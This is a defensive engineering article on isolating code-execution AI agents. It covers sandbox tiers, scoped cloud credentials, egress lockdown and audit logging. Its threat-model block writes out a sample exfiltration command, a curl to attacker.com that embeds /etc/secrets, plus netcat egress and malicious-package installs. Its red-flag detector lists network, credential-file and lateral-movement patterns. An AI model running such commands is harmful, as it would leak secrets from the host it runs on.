# S-1108 · The Execution Sandbox Stack — When Your Agent Writes Code and the Host Trusts All of It

Your agent needs to run Python, execute shell commands, or query databases to complete tasks. You give it a `bash` tool, a code interpreter, or a database connector. It writes and runs code on your infrastructure. The OS grants it whatever permissions the agent process already has. This is not a theoretical risk — Microsoft published research in May 2026 showing prompt injection chains leading to remote code execution across multiple production agent frameworks. CISA issued a joint advisory the same month flagging that most deployments grant agents broad tool access under a single credential.

This is the **execution sandbox problem**: agents generate and run untrusted code on infrastructure that was not designed to treat that code as untrusted.

## Forces

- **Agents write code dynamically; traditional isolation was designed for static binaries.** The agent generates new code at runtime based on context — you cannot review it before it executes. Conventional trust boundaries assume you know what you're running before you run it. Agents break that assumption.
- **Docker containers were not built for this threat model.** Namespace isolation and cgroups separate processes from each other, not from the host. A malicious agent inside a Docker container can escalate to root, mount the host filesystem, or exfiltrate secrets through side channels. CVE-2024-21646 (container root escape) is one of dozens of documented escape paths.
- **gVisor and Firecracker add meaningful overhead — which creates a production tradeoff.** A Firecracker microVM cold-starts in ~125ms; a gVisor sandbox in ~10ms. For high-frequency code execution (every user query), the isolation tax matters. Teams that choose convenience over isolation pay the price when a prompt injection succeeds.
- **Credential scoping is the harder problem.** Even a perfect sandbox fails if the agent runs with a broad AWS IAM role. The sandbox protects the host OS; it does not protect the cloud account. Short-lived scoped credentials, deny-by-default egress policies, and per-sandbox identity are required layers beyond isolation.
- **Audit trails from sandboxes are operationally fragile.** Every execution generates stdout/stderr/exit code, but most teams discard this data by default. When a compliance audit asks what code ran in production last quarter, the answer is "we don't know."

## The move

**Tier isolation by blast radius:**

| Tool type | Isolation level | Technology | Latency |
|-----------|----------------|------------|---------|
| Read-only computation (no I/O) | OS namespace | Docker, rootless | <1ms |
| Shell commands, file writes | App-level kernel intercept | gVisor (runsc) | ~10ms |
| Network calls, API access | Hardware VM | Firecracker microVM | ~125ms |
| Long-lived agent sessions | Kubernetes pod + eBPF | Agent Sandbox, e2b | ~500ms startup |

**Threat model for code-execution agents:**

```
Secret exfiltration  →  curl https://attacker.com/$(cat /etc/secrets)
Supply-chain attack  →  pip install malicious-package
Container escape     →  CVE-2024-21646 or newer
Network egress       →  nc to attacker infrastructure
Lateral movement    →  credential reuse within the sandbox's IAM scope
```

**The credential boundary pattern — never run sandboxed code with unscoped credentials:**

```python
# Instead of: agent runs with broad AWS_* env vars
# Do this: each sandbox gets a scoped, short-lived STS token

import boto3, json, subprocess

def create_sandbox_credentials(task_id: str, allowed_actions: list[str]) -> dict:
    """Create a downscoped IAM token for one sandbox session."""
    sts = boto3.client("sts")
    role_arn = f"arn:aws:iam::{ACCOUNT_ID}:role/AgentSandboxRole"

    # Assume role with external ID (prevents confused-deputy)
    creds = sts.assume_role(
        RoleArn=role_arn,
        RoleSessionName=f"sandbox-{task_id}",
        DurationSeconds=3600,
        ExternalId=task_id  # ties the session to a specific task
    )["Credentials"]

    # Craft a downscoped policy: only the specific actions allowed
    policy = {
        "Version": "2012-10-17",
        "Statement": [{
            "Effect": "Allow",
            "Action": allowed_actions,  # e.g. ["s3:GetObject", "s3:PutObject"]
            "Resource": f"arn:aws:s3:::{BUCKET_NAME}/tasks/{task_id}/*"
        }]
    }

    return {
        "aws_access_key_id": creds["AccessKeyId"],
        "aws_secret_access_key": creds["SecretAccessKey"],
        "aws_session_token": creds["SessionToken"],
        "sandbox_policy": json.dumps(policy)
    }

# The sandboxed process only sees scoped creds.
# Even if it escapes, it can only touch the allowed resource.
```

**Network egress: deny by default, allowlist explicitly:**

```yaml
# Kubernetes NetworkPolicy — applied to every sandbox pod
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: sandbox-egress-lockdown
spec:
  podSelector:
    matchLabels:
      app: agent-sandbox
  policyTypes:
    - Ingress
    - Egress
  ingress: []  # no ingress needed for compute pods
  egress:
    # Allow DNS — required for package resolution
    - ports:
        - port: 53
          protocol: UDP
    # Allow only known-safe endpoints
    - to:
        - namespaceSelector:
            matchLabels:
              name: internal-apis
      ports:
        - port: 443
    # Explicitly block everything else
```

**The audit pipeline:**

```python
import structlog, json, hashlib
from datetime import datetime

def log_code_execution(
    task_id: str,
    sandbox_id: str,
    code: str,
    language: str,
    exit_code: int,
    stdout: str,
    stderr: str,
    duration_ms: float,
    credential_scope: str,
):
    """Immutable audit log entry for every sandboxed execution."""
    entry = {
        "event_type": "sandbox_execution",
        "timestamp": datetime.utcnow().isoformat(),
        "task_id": task_id,
        "sandbox_id": sandbox_id,
        "language": language,
        "code_hash": hashlib.sha256(code.encode()).hexdigest(),
        # Store the hash, not the full code — preserves auditability
        # without embedding potentially malicious content in logs
        "exit_code": exit_code,
        "duration_ms": round(duration_ms, 2),
        "credential_scope": credential_scope,
        # stdout/stderr are large — route to object storage
        # and store only the reference here
        "output_ref": f"s3://{AUDIT_BUCKET}/executions/{task_id}/{sandbox_id}/{datetime.utcnow().strftime('%Y%m%d%H%M%S')}.json",
        "red_flags": detect_red_flags(code, stderr),
    }
    structlog.get_logger().info("sandbox_execution", **entry)

def detect_red_flags(code: str, stderr: str) -> list[str]:
    """Fast pre-filter for obvious exfiltration patterns before full analysis."""
    patterns = [
        ("base64_decode_chain", r"base64.*decode|__import__\(.*base64"),
        ("network_from_code", r"socket\.|requests\.|urllib|http\.\w+|curl|wget|nc "),
        ("credential_access", r"os\.environ\[|getenv\(|~/.ssh|/etc/passwd"),
        ("lateral_movement", r"ssh |scp |rsync |kubectl exec"),
    ]
    return [
        name for name, pattern in patterns
        if re.search(pattern, code, re.IGNORECASE) or re.search(pattern, stderr, re.IGNORECASE)
    ]
```

**Decision framework — pick the isolation level that matches the blast radius:**

1. **Does this tool write files or make network calls?** If yes, Docker alone is insufficient.
2. **Can this agent act on behalf of a user?** If yes, credential scoping is non-negotiable — isolation without scoped credentials is theater.
3. **What is the latency budget?** gVisor adds ~10ms per call; Firecracker ~125ms. Profile before choosing.
4. **Is the code executor short-lived or long-lived?** Long-lived agents (session resumptions) need Kubernetes-native lifecycle management (suspend/resume), not raw container restarts.

## Receipt

> Verified 2026-07-14 — Research sourced from: TURION.ai "Agent Sandboxing: Firecracker, gVisor & Production Isolation" (May 22, 2026), AppScale Blog "Secure Code Execution Sandboxes for AI Agents" (June 23, 2026), Microsoft Security research (May 7, 2026), CISA joint advisory (May 1, 2026), Agent Sandbox SIG K8s (agent-sandbox.sigs.k8s.io), Kodekloud "Running AI Agents Safely Inside Kubernetes" (2026).

## See also

- [S-902 · The Scaffold Supply Chain Stack](s902-the-scaffold-supply-chain-stack-when-your-agent-builds-a-backdoor-into-your-own-infra.md) — scaffold poisoning; execution sandbox is the structural complement to supply chain defense
- [S-1000 · Structural Agent Governance Stack](s1000-structural-agent-governance-stack-when-your-prompt-based-guardrails-break-under-pressure.md) — governance; execution sandbox is the structural enforcement layer below prompt-based guardrails
- [S-902](s902-the-scaffold-supply-chain-stack-when-your-agent-builds-a-backdoor-into-your-own-infra.md) and [S-1006 · The Agent Toolbelt Problem](s1006-the-agent-toolbelt-problem-what-tools-do-you-actually-give-an-agent.md) — tool definition review; execution sandbox validates that tool calls respect blast radius even when the tool definition is correct
- [S-1037 · The Evaluation Gap](s1037-the-evaluation-gap-when-your-agent-scores-high-and-fails-in-production.md) — production distribution gaps; sandbox audit logs (code_hash, credential_scope, red_flags) feed eval datasets
